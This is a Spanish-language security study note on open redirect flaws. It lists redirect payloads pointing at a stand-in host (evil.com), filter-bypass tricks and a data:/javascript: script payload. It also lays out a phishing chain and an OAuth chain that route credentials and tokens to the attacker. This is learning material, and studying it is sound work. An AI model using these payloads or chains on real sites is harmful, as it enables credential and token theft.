---
title: "Open Redirect"
type: note
status: active
tags:
  - seguridad
  - web
  - open-redirect
  - vulnerabilidades
aliases:
  - Open Redirect
  - Redireccion abierta
created: 2026-06-13
updated: 2026-06-13
---

# Open Redirect

> [!INFO] Fuente
> PortSwigger, PayloadsAllTheThings.

---

## Que es

Un endpoint que redirige a URLs controladas por el atacante sin validacion. Por si solo es de baja severidad, pero se combina con otras vulnerabilidades para:

- **Bypass de SameSite** (las redirecciones no llevan SameSite=Strict)
- **Phishing** (dominio legitimo → redireccion a sitio malicioso)
- **Bypass de allowlists** (OAuth redirect_uri)
- **Bypass de WAF** (inyeccion en parametro, redirigido a pagina sin WAF)

---

## Donde buscar

```http
GET /redirect?url=https://evil.com
GET /go?to=https://evil.com
GET /out?url=https://evil.com
GET /link?href=https://evil.com
GET /next=https://evil.com
GET /returnUrl=/evil

GET /api/auth?redirect_uri=https://evil.com
GET /logout?redirect=https://evil.com
GET /login?redirect_uri=https://evil.com
```

---

## Payloads

```yaml
https://target.com/redirect?url=https://evil.com
https://target.com/redirect?url=//evil.com
https://target.com/redirect?url=\evil.com
https://target.com/redirect?url=https://target.com.evil.com
https://target.com/redirect?url=https://evil.com%2F%2Ftarget.com
https://target.com/redirect?url=https://target.com@evil.com
https://target.com/redirect?url=/%09/evil.com
https://target.com/redirect?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

---

## Bypass

### Domain check bypass

```php
// Si solo verifica que contenga target.com:
https://target.com/redirect?url=https://target.com.malicious.com
https://target.com/redirect?url=https://malicious.com/target.com

// Si usa strpos:
if (strpos($url, 'target.com') !== false) {
  // redirect
}
// Bypass: https://target.com.malicious.com
```

### Protocol check bypass

```php
// Si solo permite http/https:
// Usar javascript: o data:
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

### URL parsing confusion

```php
// Diferencia entre parse_url y como el browser interpreta
url: https://target.com@evil.com
  parse_url → host: target.com  (mal)
  browser → va a evil.com       (bien)
```

---

## Open Redirect + Phishing

```
1. Encontrar open redirect en target.com
2. Crear pagina de phishing identica al login de target.com
3. Enviar email:
   "Tu cuenta ha sido comprometida. Cambia tu password:
   https://target.com/redirect?url=https://evil.com/login"
4. Victima ve dominio legitimo → confia → pone credenciales
5. Atacante captura credenciales
```

---

## Open Redirect + OAuth

```http
https://target.com/oauth/authorize?redirect_uri=https://target.com/redirect?url=https://evil.com

# Si OAuth tiene allowlist de redirect URIs
# Pero el redirect_uri apunta a un open redirect en la misma app
# → El token de OAuth termina en evil.com
```

---

## Severidad

| Contexto | Severidad |
|----------|-----------|
| Open redirect solo | Baja (Info) |
| Open redirect + phishing | Media |
| Open redirect + OAuth token leak | Alta |
| Open redirect + SameSite bypass | Alta |
| Open redirect + WAF bypass | Depende del bypass |

---

## Labs

| Recurso | Link |
|---------|------|
| PortSwigger | portswigger.net/web-security/dom-based/open-redirection |

---

## Ver tambien

- [[SEGURIDAD/Vulnerabilidades Web]]
- [[SEGURIDAD/00 - INDICE]]
